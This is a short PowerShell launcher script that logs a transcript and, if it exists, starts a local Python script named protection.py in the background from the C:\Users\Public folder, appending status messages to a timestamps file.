# Define log file
$logFile = "C:\Users\Public\Other\Schedule\run_schedule.log"

# Redirect output and errors to log file
Start-Transcript -Path $logFile -Append


$scriptPath = "C:\Users\Public\Other\Protection\protection.py"

# Get the path to Python executable
$python_path = (Get-Command python).Definition


# Call the downloaded script if exist
if (Test-Path -Path $scriptPath) {
	$scriptPathNoExtension = [System.IO.Path]::GetFileNameWithoutExtension($scriptPath)
	$env:PYTHONWARNINGS="ignore"

    # Start the Python script in the background
    Write-Output "[!] Trying to run script in the background!" | Out-File "C:\Users\Public\Other\Schedule\timestamps.txt" -Append

	Start-Process -NoNewWindow -FilePath "$python_path" -ArgumentList "$scriptPath"

    Write-Output "[*] Python script executed in the background!" | Out-File "C:\Users\Public\Other\Schedule\timestamps.txt" -Append

	# Execute the script
	#& "$python_path" "$scriptPath" > $null 2>&1
	#echo "[*] Python Script executed!"
} else {
    Write-Output "[!] The script at $scriptPath does not exist. Cannot execute."
}

# End logging
Stop-Transcript
